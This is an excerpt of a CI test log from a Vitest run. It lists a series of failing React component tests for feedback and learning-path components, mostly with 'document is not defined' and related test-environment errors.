2025-11-18T17:36:11.3752872Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[301/545]⎯[22m[39m
2025-11-18T17:36:11.3752887Z 
2025-11-18T17:36:11.3754239Z [31m[1m[7m FAIL [27m[22m[39m __tests__/components/feedback/FeedbackButton.test.tsx[2m > [22mFeedbackButton[2m > [22mremoves pulse animation after interaction
2025-11-18T17:36:11.3754744Z [31m[1mTypeError[22m: renderWithAct is not a function[39m
2025-11-18T17:36:11.3755480Z [36m [2m❯[22m __tests__/components/feedback/FeedbackButton.test.tsx:[2m53:11[22m[39m
2025-11-18T17:36:11.3755700Z     [90m 51| [39m
2025-11-18T17:36:11.3756213Z     [90m 52| [39m  it('removes pulse animation after interaction', async () => {
2025-11-18T17:36:11.3756627Z     [90m 53| [39m    await renderWithAct(<FeedbackButton />);
2025-11-18T17:36:11.3757110Z     [90m   | [39m          [31m^[39m
2025-11-18T17:36:11.3757555Z     [90m 54| [39m    const button = screen.getByRole('button');
2025-11-18T17:36:11.3757772Z     [90m 55| [39m    
2025-11-18T17:36:11.3757788Z 
2025-11-18T17:36:11.3758187Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[302/545]⎯[22m[39m
2025-11-18T17:36:11.3758202Z 
2025-11-18T17:36:11.3759438Z [31m[1m[7m FAIL [27m[22m[39m __tests__/components/feedback/FeedbackDetail.test.tsx[2m > [22mFeedbackDetail[2m > [22mdoes not render when not open
2025-11-18T17:36:11.3759917Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.3760618Z [90m [2m❯[22m render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.3761548Z [36m [2m❯[22m __tests__/components/feedback/FeedbackDetail.test.tsx:[2m50:5[22m[39m
2025-11-18T17:36:11.3761729Z     [90m 48| [39m
2025-11-18T17:36:11.3762117Z     [90m 49| [39m  it('does not render when not open', () => {
2025-11-18T17:36:11.3762345Z     [90m 50| [39m    render(
2025-11-18T17:36:11.3762576Z     [90m   | [39m    [31m^[39m
2025-11-18T17:36:11.3762859Z     [90m 51| [39m      <FeedbackDetail
2025-11-18T17:36:11.3763170Z     [90m 52| [39m        feedback={mockFeedback}
2025-11-18T17:36:11.3763183Z 
2025-11-18T17:36:11.3763552Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[303/545]⎯[22m[39m
2025-11-18T17:36:11.3763565Z 
2025-11-18T17:36:11.3764688Z [31m[1m[7m FAIL [27m[22m[39m __tests__/components/feedback/FeedbackDetail.test.tsx[2m > [22mFeedbackDetail[2m > [22mrenders when open
2025-11-18T17:36:11.3765148Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.3765854Z [90m [2m❯[22m render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.3766568Z [36m [2m❯[22m __tests__/components/feedback/FeedbackDetail.test.tsx:[2m63:5[22m[39m
2025-11-18T17:36:11.3766747Z     [90m 61| [39m
2025-11-18T17:36:11.3767483Z     [90m 62| [39m  it('renders when open', async () => {
2025-11-18T17:36:11.3767894Z     [90m 63| [39m    render(
2025-11-18T17:36:11.3768661Z     [90m   | [39m    [31m^[39m
2025-11-18T17:36:11.3769187Z     [90m 64| [39m      <FeedbackDetail
2025-11-18T17:36:11.3769824Z     [90m 65| [39m        feedback={mockFeedback}
2025-11-18T17:36:11.3769846Z 
2025-11-18T17:36:11.3770635Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[304/545]⎯[22m[39m
2025-11-18T17:36:11.3770655Z 
2025-11-18T17:36:11.3771905Z [31m[1m[7m FAIL [27m[22m[39m __tests__/components/feedback/FeedbackDetail.test.tsx[2m > [22mFeedbackDetail[2m > [22mdisplays feedback information
2025-11-18T17:36:11.3772365Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.3773078Z [90m [2m❯[22m render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.3773766Z [36m [2m❯[22m __tests__/components/feedback/FeedbackDetail.test.tsx:[2m76:5[22m[39m
2025-11-18T17:36:11.3773946Z     [90m 74| [39m
2025-11-18T17:36:11.3774373Z     [90m 75| [39m  it('displays feedback information', async () => {
2025-11-18T17:36:11.3774619Z     [90m 76| [39m    render(
2025-11-18T17:36:11.3774856Z     [90m   | [39m    [31m^[39m
2025-11-18T17:36:11.3775120Z     [90m 77| [39m      <FeedbackDetail
2025-11-18T17:36:11.3775426Z     [90m 78| [39m        feedback={mockFeedback}
2025-11-18T17:36:11.3775440Z 
2025-11-18T17:36:11.3775813Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[305/545]⎯[22m[39m
2025-11-18T17:36:11.3775826Z 
2025-11-18T17:36:11.3777270Z [31m[1m[7m FAIL [27m[22m[39m __tests__/components/feedback/FeedbackDetail.test.tsx[2m > [22mFeedbackDetail[2m > [22mdisplays correct icon for bug type
2025-11-18T17:36:11.3777960Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.3778659Z [90m [2m❯[22m render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.3779356Z [36m [2m❯[22m __tests__/components/feedback/FeedbackDetail.test.tsx:[2m92:27[22m[39m
2025-11-18T17:36:11.3779541Z     [90m 90| [39m
2025-11-18T17:36:11.3780025Z     [90m 91| [39m  it('displays correct icon for bug type', async () => {
2025-11-18T17:36:11.3780342Z     [90m 92| [39m    const { container } = render(
2025-11-18T17:36:11.3780648Z     [90m   | [39m                          [31m^[39m
2025-11-18T17:36:11.3780914Z     [90m 93| [39m      <FeedbackDetail
2025-11-18T17:36:11.3781302Z     [90m 94| [39m        feedback={{ ...mockFeedback, type: 'bug' }}
2025-11-18T17:36:11.3781316Z 
2025-11-18T17:36:11.3781682Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[306/545]⎯[22m[39m
2025-11-18T17:36:11.3781695Z 
2025-11-18T17:36:11.3782953Z [31m[1m[7m FAIL [27m[22m[39m __tests__/components/feedback/FeedbackDetail.test.tsx[2m > [22mFeedbackDetail[2m > [22mdisplays correct icon for idea type
2025-11-18T17:36:11.3783420Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.3784114Z [90m [2m❯[22m render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.3784830Z [36m [2m❯[22m __tests__/components/feedback/FeedbackDetail.test.tsx:[2m107:27[22m[39m
2025-11-18T17:36:11.3785198Z     [90m105| [39m
2025-11-18T17:36:11.3785685Z     [90m106| [39m  it('displays correct icon for idea type', async () => {
2025-11-18T17:36:11.3786003Z     [90m107| [39m    const { container } = render(
2025-11-18T17:36:11.3786314Z     [90m   | [39m                          [31m^[39m
2025-11-18T17:36:11.3786573Z     [90m108| [39m      <FeedbackDetail
2025-11-18T17:36:11.3787185Z     [90m109| [39m        feedback={{ ...mockFeedback, type: 'idea' }}
2025-11-18T17:36:11.3787214Z 
2025-11-18T17:36:11.3787795Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[307/545]⎯[22m[39m
2025-11-18T17:36:11.3787829Z 
2025-11-18T17:36:11.3789055Z [31m[1m[7m FAIL [27m[22m[39m __tests__/components/feedback/FeedbackDetail.test.tsx[2m > [22mFeedbackDetail[2m > [22mdisplays screenshot when present
2025-11-18T17:36:11.3789522Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.3790403Z [90m [2m❯[22m render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.3791095Z [36m [2m❯[22m __tests__/components/feedback/FeedbackDetail.test.tsx:[2m122:5[22m[39m
2025-11-18T17:36:11.3791264Z     [90m120| [39m
2025-11-18T17:36:11.3791695Z     [90m121| [39m  it('displays screenshot when present', async () => {
2025-11-18T17:36:11.3791908Z     [90m122| [39m    render(
2025-11-18T17:36:11.3792127Z     [90m   | [39m    [31m^[39m
2025-11-18T17:36:11.3792373Z     [90m123| [39m      <FeedbackDetail
2025-11-18T17:36:11.3792661Z     [90m124| [39m        feedback={mockFeedback}
2025-11-18T17:36:11.3792680Z 
2025-11-18T17:36:11.3793030Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[308/545]⎯[22m[39m
2025-11-18T17:36:11.3793041Z 
2025-11-18T17:36:11.3794328Z [31m[1m[7m FAIL [27m[22m[39m __tests__/components/feedback/FeedbackDetail.test.tsx[2m > [22mFeedbackDetail[2m > [22mdoes not display screenshot section when not present
2025-11-18T17:36:11.3794749Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.3795421Z [90m [2m❯[22m render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.3796164Z [36m [2m❯[22m __tests__/components/feedback/FeedbackDetail.test.tsx:[2m139:5[22m[39m
2025-11-18T17:36:11.3796950Z     [90m137| [39m  it('does not display screenshot section when not present', async () …
2025-11-18T17:36:11.3797545Z     [90m138| [39m    const feedbackWithoutScreenshot = { ...mockFeedback, screenshot_ur…
2025-11-18T17:36:11.3797740Z     [90m139| [39m    render(
2025-11-18T17:36:11.3797959Z     [90m   | [39m    [31m^[39m
2025-11-18T17:36:11.3798461Z     [90m140| [39m      <FeedbackDetail
2025-11-18T17:36:11.3798892Z     [90m141| [39m        feedback={feedbackWithoutScreenshot}
2025-11-18T17:36:11.3798908Z 
2025-11-18T17:36:11.3799304Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[309/545]⎯[22m[39m
2025-11-18T17:36:11.3799317Z 
2025-11-18T17:36:11.3800697Z [31m[1m[7m FAIL [27m[22m[39m __tests__/components/feedback/FeedbackDetail.test.tsx[2m > [22mFeedbackDetail[2m > [22mdisplays browser info in collapsible section
2025-11-18T17:36:11.3801200Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.3801947Z [90m [2m❯[22m render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.3802687Z [36m [2m❯[22m __tests__/components/feedback/FeedbackDetail.test.tsx:[2m153:5[22m[39m
2025-11-18T17:36:11.3802903Z     [90m151| [39m
2025-11-18T17:36:11.3803466Z     [90m152| [39m  it('displays browser info in collapsible section', async () => {
2025-11-18T17:36:11.3803699Z     [90m153| [39m    render(
2025-11-18T17:36:11.3803952Z     [90m   | [39m    [31m^[39m
2025-11-18T17:36:11.3804210Z     [90m154| [39m      <FeedbackDetail
2025-11-18T17:36:11.3804520Z     [90m155| [39m        feedback={mockFeedback}
2025-11-18T17:36:11.3804534Z 
2025-11-18T17:36:11.3804907Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[310/545]⎯[22m[39m
2025-11-18T17:36:11.3804919Z 
2025-11-18T17:36:11.3806536Z [31m[1m[7m FAIL [27m[22m[39m __tests__/components/feedback/FeedbackDetail.test.tsx[2m > [22mFeedbackDetail[2m > [22mshows status action buttons based on current status
2025-11-18T17:36:11.3808051Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.3808757Z [90m [2m❯[22m render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.3809447Z [36m [2m❯[22m __tests__/components/feedback/FeedbackDetail.test.tsx:[2m166:5[22m[39m
2025-11-18T17:36:11.3809628Z     [90m164| [39m
2025-11-18T17:36:11.3810192Z     [90m165| [39m  it('shows status action buttons based on current status', async () =…
2025-11-18T17:36:11.3810433Z     [90m166| [39m    render(
2025-11-18T17:36:11.3810672Z     [90m   | [39m    [31m^[39m
2025-11-18T17:36:11.3810933Z     [90m167| [39m      <FeedbackDetail
2025-11-18T17:36:11.3811390Z     [90m168| [39m        feedback={{ ...mockFeedback, status: 'new' }}
2025-11-18T17:36:11.3811407Z 
2025-11-18T17:36:11.3811822Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[311/545]⎯[22m[39m
2025-11-18T17:36:11.3811852Z 
2025-11-18T17:36:11.3813223Z [31m[1m[7m FAIL [27m[22m[39m __tests__/components/feedback/FeedbackDetail.test.tsx[2m > [22mFeedbackDetail[2m > [22mcalls onStatusUpdate when status button is clicked
2025-11-18T17:36:11.3814344Z [31m[1mTypeError[22m: Cannot read properties of undefined (reading 'Symbol(Node prepared with document state workarounds)')[39m
2025-11-18T17:36:11.3815531Z [90m [2m❯[22m prepareDocument node_modules/@testing-library/user-event/dist/esm/document/prepareDocument.js:[2m10:17[22m[39m
2025-11-18T17:36:11.3816636Z [90m [2m❯[22m Object.setupMain [as setup] node_modules/@testing-library/user-event/dist/esm/setup/setup.js:[2m52:5[22m[39m
2025-11-18T17:36:11.3817721Z [36m [2m❯[22m __tests__/components/feedback/FeedbackDetail.test.tsx:[2m180:28[22m[39m
2025-11-18T17:36:11.3817933Z     [90m178| [39m
2025-11-18T17:36:11.3818520Z     [90m179| [39m  it('calls onStatusUpdate when status button is clicked', async () =>…
2025-11-18T17:36:11.3818878Z     [90m180| [39m    const user = userEvent.setup();
2025-11-18T17:36:11.3819194Z     [90m   | [39m                           [31m^[39m
2025-11-18T17:36:11.3819429Z     [90m181| [39m    render(
2025-11-18T17:36:11.3819707Z     [90m182| [39m      <FeedbackDetail
2025-11-18T17:36:11.3819720Z 
2025-11-18T17:36:11.3820108Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[312/545]⎯[22m[39m
2025-11-18T17:36:11.3820121Z 
2025-11-18T17:36:11.3821307Z [31m[1m[7m FAIL [27m[22m[39m __tests__/components/feedback/FeedbackDetail.test.tsx[2m > [22mFeedbackDetail[2m > [22mdisplays comment input
2025-11-18T17:36:11.3822001Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.3822706Z [90m [2m❯[22m render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.3823408Z [36m [2m❯[22m __tests__/components/feedback/FeedbackDetail.test.tsx:[2m196:5[22m[39m
2025-11-18T17:36:11.3823593Z     [90m194| [39m
2025-11-18T17:36:11.3823996Z     [90m195| [39m  it('displays comment input', async () => {
2025-11-18T17:36:11.3824223Z     [90m196| [39m    render(
2025-11-18T17:36:11.3824447Z     [90m   | [39m    [31m^[39m
2025-11-18T17:36:11.3824715Z     [90m197| [39m      <FeedbackDetail
2025-11-18T17:36:11.3825020Z     [90m198| [39m        feedback={mockFeedback}
2025-11-18T17:36:11.3825034Z 
2025-11-18T17:36:11.3825400Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[313/545]⎯[22m[39m
2025-11-18T17:36:11.3825412Z 
2025-11-18T17:36:11.3826499Z [31m[1m[7m FAIL [27m[22m[39m __tests__/components/feedback/FeedbackDetail.test.tsx[2m > [22mFeedbackDetail[2m > [22mcan add comments
2025-11-18T17:36:11.3827790Z [31m[1mTypeError[22m: Cannot read properties of undefined (reading 'Symbol(Node prepared with document state workarounds)')[39m
2025-11-18T17:36:11.3828929Z [90m [2m❯[22m prepareDocument node_modules/@testing-library/user-event/dist/esm/document/prepareDocument.js:[2m10:17[22m[39m
2025-11-18T17:36:11.3830293Z [90m [2m❯[22m Object.setupMain [as setup] node_modules/@testing-library/user-event/dist/esm/setup/setup.js:[2m52:5[22m[39m
2025-11-18T17:36:11.3831085Z [36m [2m❯[22m __tests__/components/feedback/FeedbackDetail.test.tsx:[2m209:28[22m[39m
2025-11-18T17:36:11.3831296Z     [90m207| [39m
2025-11-18T17:36:11.3831658Z     [90m208| [39m  it('can add comments', async () => {
2025-11-18T17:36:11.3832024Z     [90m209| [39m    const user = userEvent.setup();
2025-11-18T17:36:11.3832365Z     [90m   | [39m                           [31m^[39m
2025-11-18T17:36:11.3832611Z     [90m210| [39m    render(
2025-11-18T17:36:11.3832895Z     [90m211| [39m      <FeedbackDetail
2025-11-18T17:36:11.3832910Z 
2025-11-18T17:36:11.3833303Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[314/545]⎯[22m[39m
2025-11-18T17:36:11.3833318Z 
2025-11-18T17:36:11.3834628Z [31m[1m[7m FAIL [27m[22m[39m __tests__/components/feedback/FeedbackDetail.test.tsx[2m > [22mFeedbackDetail[2m > [22mcloses modal when close button is clicked
2025-11-18T17:36:11.3835749Z [31m[1mTypeError[22m: Cannot read properties of undefined (reading 'Symbol(Node prepared with document state workarounds)')[39m
2025-11-18T17:36:11.3837057Z [90m [2m❯[22m prepareDocument node_modules/@testing-library/user-event/dist/esm/document/prepareDocument.js:[2m10:17[22m[39m
2025-11-18T17:36:11.3838145Z [90m [2m❯[22m Object.setupMain [as setup] node_modules/@testing-library/user-event/dist/esm/setup/setup.js:[2m52:5[22m[39m
2025-11-18T17:36:11.3838915Z [36m [2m❯[22m __tests__/components/feedback/FeedbackDetail.test.tsx:[2m236:28[22m[39m
2025-11-18T17:36:11.3839156Z     [90m234| [39m
2025-11-18T17:36:11.3839702Z     [90m235| [39m  it('closes modal when close button is clicked', async () => {
2025-11-18T17:36:11.3840080Z     [90m236| [39m    const user = userEvent.setup();
2025-11-18T17:36:11.3840420Z     [90m   | [39m                           [31m^[39m
2025-11-18T17:36:11.3840651Z     [90m237| [39m    render(
2025-11-18T17:36:11.3840905Z     [90m238| [39m      <FeedbackDetail
2025-11-18T17:36:11.3840945Z 
2025-11-18T17:36:11.3841340Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[315/545]⎯[22m[39m
2025-11-18T17:36:11.3841356Z 
2025-11-18T17:36:11.3842658Z [31m[1m[7m FAIL [27m[22m[39m __tests__/components/feedback/FeedbackDetail.test.tsx[2m > [22mFeedbackDetail[2m > [22mcloses modal when overlay is clicked
2025-11-18T17:36:11.3843759Z [31m[1mTypeError[22m: Cannot read properties of undefined (reading 'Symbol(Node prepared with document state workarounds)')[39m
2025-11-18T17:36:11.3844868Z [90m [2m❯[22m prepareDocument node_modules/@testing-library/user-event/dist/esm/document/prepareDocument.js:[2m10:17[22m[39m
2025-11-18T17:36:11.3846126Z [90m [2m❯[22m Object.setupMain [as setup] node_modules/@testing-library/user-event/dist/esm/setup/setup.js:[2m52:5[22m[39m
2025-11-18T17:36:11.3858182Z [36m [2m❯[22m __tests__/components/feedback/FeedbackDetail.test.tsx:[2m252:28[22m[39m
2025-11-18T17:36:11.3858487Z     [90m250| [39m
2025-11-18T17:36:11.3859077Z     [90m251| [39m  it('closes modal when overlay is clicked', async () => {
2025-11-18T17:36:11.3859416Z     [90m252| [39m    const user = userEvent.setup();
2025-11-18T17:36:11.3859722Z     [90m   | [39m                           [31m^[39m
2025-11-18T17:36:11.3859943Z     [90m253| [39m    render(
2025-11-18T17:36:11.3860180Z     [90m254| [39m      <FeedbackDetail
2025-11-18T17:36:11.3860194Z 
2025-11-18T17:36:11.3860558Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[316/545]⎯[22m[39m
2025-11-18T17:36:11.3860577Z 
2025-11-18T17:36:11.3861892Z [31m[1m[7m FAIL [27m[22m[39m __tests__/components/feedback/FeedbackDetail.test.tsx[2m > [22mFeedbackDetail[2m > [22mopens full screenshot modal when screenshot is clicked
2025-11-18T17:36:11.3862890Z [31m[1mTypeError[22m: Cannot read properties of undefined (reading 'Symbol(Node prepared with document state workarounds)')[39m
2025-11-18T17:36:11.3864149Z [90m [2m❯[22m prepareDocument node_modules/@testing-library/user-event/dist/esm/document/prepareDocument.js:[2m10:17[22m[39m
2025-11-18T17:36:11.3865127Z [90m [2m❯[22m Object.setupMain [as setup] node_modules/@testing-library/user-event/dist/esm/setup/setup.js:[2m52:5[22m[39m
2025-11-18T17:36:11.3865790Z [36m [2m❯[22m __tests__/components/feedback/FeedbackDetail.test.tsx:[2m268:28[22m[39m
2025-11-18T17:36:11.3865971Z     [90m266| [39m
2025-11-18T17:36:11.3866513Z     [90m267| [39m  it('opens full screenshot modal when screenshot is clicked', async (…
2025-11-18T17:36:11.3867033Z     [90m268| [39m    const user = userEvent.setup();
2025-11-18T17:36:11.3867358Z     [90m   | [39m                           [31m^[39m
2025-11-18T17:36:11.3867648Z     [90m269| [39m    render(
2025-11-18T17:36:11.3867906Z     [90m270| [39m      <FeedbackDetail
2025-11-18T17:36:11.3867918Z 
2025-11-18T17:36:11.3868278Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[317/545]⎯[22m[39m
2025-11-18T17:36:11.3868289Z 
2025-11-18T17:36:11.3869396Z [31m[1m[7m FAIL [27m[22m[39m __tests__/components/feedback/FeedbackDetail.test.tsx[2m > [22mFeedbackDetail[2m > [22mformats dates correctly
2025-11-18T17:36:11.3869822Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.3870493Z [90m [2m❯[22m render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.3871157Z [36m [2m❯[22m __tests__/components/feedback/FeedbackDetail.test.tsx:[2m288:5[22m[39m
2025-11-18T17:36:11.3871521Z     [90m286| [39m    const testDate = '2025-01-23T10:30:00Z';
2025-11-18T17:36:11.3872069Z     [90m287| [39m    const feedbackWithDate = { ...mockFeedback, created_at: testDate };
2025-11-18T17:36:11.3872310Z     [90m288| [39m    render(
2025-11-18T17:36:11.3872548Z     [90m   | [39m    [31m^[39m
2025-11-18T17:36:11.3872792Z     [90m289| [39m      <FeedbackDetail
2025-11-18T17:36:11.3873108Z     [90m290| [39m        feedback={feedbackWithDate}
2025-11-18T17:36:11.3873120Z 
2025-11-18T17:36:11.3873461Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[318/545]⎯[22m[39m
2025-11-18T17:36:11.3873472Z 
2025-11-18T17:36:11.3874532Z [31m[1m[7m FAIL [27m[22m[39m __tests__/components/feedback/FeedbackDetail.test.tsx[2m > [22mFeedbackDetail[2m > [22mshows reference number
2025-11-18T17:36:11.3874928Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.3875597Z [90m [2m❯[22m render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.3876334Z [36m [2m❯[22m __tests__/components/feedback/FeedbackDetail.test.tsx:[2m301:5[22m[39m
2025-11-18T17:36:11.3876553Z     [90m299| [39m
2025-11-18T17:36:11.3877375Z     [90m300| [39m  it('shows reference number', async () => {
2025-11-18T17:36:11.3878194Z     [90m301| [39m    render(
2025-11-18T17:36:11.3878484Z     [90m   | [39m    [31m^[39m
2025-11-18T17:36:11.3878991Z     [90m302| [39m      <FeedbackDetail
2025-11-18T17:36:11.3879351Z     [90m303| [39m        feedback={mockFeedback}
2025-11-18T17:36:11.3879371Z 
2025-11-18T17:36:11.3880071Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[319/545]⎯[22m[39m
2025-11-18T17:36:11.3880110Z 
2025-11-18T17:36:11.3882253Z [31m[1m[7m FAIL [27m[22m[39m __tests__/components/feedback/FeedbackModal.test.tsx[2m > [22mFeedbackModal[2m > [22mdoes not render when closed
2025-11-18T17:36:11.3883258Z [31m[1m[7m FAIL [27m[22m[39m __tests__/components/feedback/FeedbackModal.test.tsx[2m > [22mFeedbackModal[2m > [22mrenders when open
2025-11-18T17:36:11.3884299Z [31m[1m[7m FAIL [27m[22m[39m __tests__/components/feedback/FeedbackModal.test.tsx[2m > [22mFeedbackModal[2m > [22mhas description textarea
2025-11-18T17:36:11.3885324Z [31m[1m[7m FAIL [27m[22m[39m __tests__/components/feedback/FeedbackModal.test.tsx[2m > [22mFeedbackModal[2m > [22mhas type selector buttons
2025-11-18T17:36:11.3886374Z [31m[1m[7m FAIL [27m[22m[39m __tests__/components/feedback/FeedbackModal.test.tsx[2m > [22mFeedbackModal[2m > [22mhas screenshot upload area
2025-11-18T17:36:11.3888021Z [31m[1m[7m FAIL [27m[22m[39m __tests__/components/feedback/FeedbackModal.test.tsx[2m > [22mFeedbackModal[2m > [22mupdates type when buttons are clicked
2025-11-18T17:36:11.3889190Z [31m[1m[7m FAIL [27m[22m[39m __tests__/components/feedback/FeedbackModal.test.tsx[2m > [22mFeedbackModal[2m > [22mupdates description when typing
2025-11-18T17:36:11.3890365Z [31m[1m[7m FAIL [27m[22m[39m __tests__/components/feedback/FeedbackModal.test.tsx[2m > [22mFeedbackModal[2m > [22mshows error when submitting empty description
2025-11-18T17:36:11.3891440Z [31m[1m[7m FAIL [27m[22m[39m __tests__/components/feedback/FeedbackModal.test.tsx[2m > [22mFeedbackModal[2m > [22mhandles file selection
2025-11-18T17:36:11.3892558Z [31m[1m[7m FAIL [27m[22m[39m __tests__/components/feedback/FeedbackModal.test.tsx[2m > [22mFeedbackModal[2m > [22mrejects files larger than 5MB
2025-11-18T17:36:11.3893746Z [31m[1m[7m FAIL [27m[22m[39m __tests__/components/feedback/FeedbackModal.test.tsx[2m > [22mFeedbackModal[2m > [22mcloses modal when close button is clicked
2025-11-18T17:36:11.3894920Z [31m[1m[7m FAIL [27m[22m[39m __tests__/components/feedback/FeedbackModal.test.tsx[2m > [22mFeedbackModal[2m > [22mcloses modal when cancel button is clicked
2025-11-18T17:36:11.3896071Z [31m[1m[7m FAIL [27m[22m[39m __tests__/components/feedback/FeedbackModal.test.tsx[2m > [22mFeedbackModal[2m > [22mdisables submit button when submitting
2025-11-18T17:36:11.3897483Z [31m[1m[7m FAIL [27m[22m[39m __tests__/components/feedback/FeedbackModal.test.tsx[2m > [22mFeedbackModal[2m > [22mshows success state after successful submission
2025-11-18T17:36:11.3898087Z [31m[1mTypeError[22m: vi.mocked(...).mockResolvedValue is not a function[39m
2025-11-18T17:36:11.3898753Z [36m [2m❯[22m __tests__/components/feedback/FeedbackModal.test.tsx:[2m85:29[22m[39m
2025-11-18T17:36:11.3898929Z     [90m 83| [39m    
2025-11-18T17:36:11.3899313Z     [90m 84| [39m    // Mock the fetch API for admin notifications
2025-11-18T17:36:11.3899697Z     [90m 85| [39m    vi.mocked(global.fetch).mockResolvedValue({
2025-11-18T17:36:11.3900001Z     [90m   | [39m                            [31m^[39m
2025-11-18T17:36:11.3900227Z     [90m 86| [39m      ok: true,
2025-11-18T17:36:11.3900713Z     [90m 87| [39m      json: async () => ({ success: true, notificationsCreated: 1 }),
2025-11-18T17:36:11.3900727Z 
2025-11-18T17:36:11.3901069Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[320/545]⎯[22m[39m
2025-11-18T17:36:11.3901080Z 
2025-11-18T17:36:11.3902617Z [31m[1m[7m FAIL [27m[22m[39m __tests__/components/learning-paths/EnhancedProgressIndicators.test.tsx[2m > [22mEnhancedProgressIndicators[2m > [22mshould render progress overview with key metrics
2025-11-18T17:36:11.3903199Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.3903905Z [90m [2m❯[22m Proxy.render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.3904752Z [36m [2m❯[22m __tests__/components/learning-paths/EnhancedProgressIndicators.test.tsx:[2m114:5[22m[39m
2025-11-18T17:36:11.3905179Z     [90m112| [39mdescribe('EnhancedProgressIndicators', () => {
2025-11-18T17:36:11.3905681Z     [90m113| [39m  it('should render progress overview with key metrics', () => {
2025-11-18T17:36:11.3905900Z     [90m114| [39m    render(
2025-11-18T17:36:11.3906132Z     [90m   | [39m    [31m^[39m
2025-11-18T17:36:11.3906437Z     [90m115| [39m      <EnhancedProgressIndicators 
2025-11-18T17:36:11.3906915Z     [90m116| [39m        data={mockEnhancedProgressData} 
2025-11-18T17:36:11.3906928Z 
2025-11-18T17:36:11.3907411Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[321/545]⎯[22m[39m
2025-11-18T17:36:11.3907436Z 
2025-11-18T17:36:11.3908997Z [31m[1m[7m FAIL [27m[22m[39m __tests__/components/learning-paths/EnhancedProgressIndicators.test.tsx[2m > [22mEnhancedProgressIndicators[2m > [22mshould display pace analysis correctly
2025-11-18T17:36:11.3909385Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.3910397Z [90m [2m❯[22m Proxy.render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
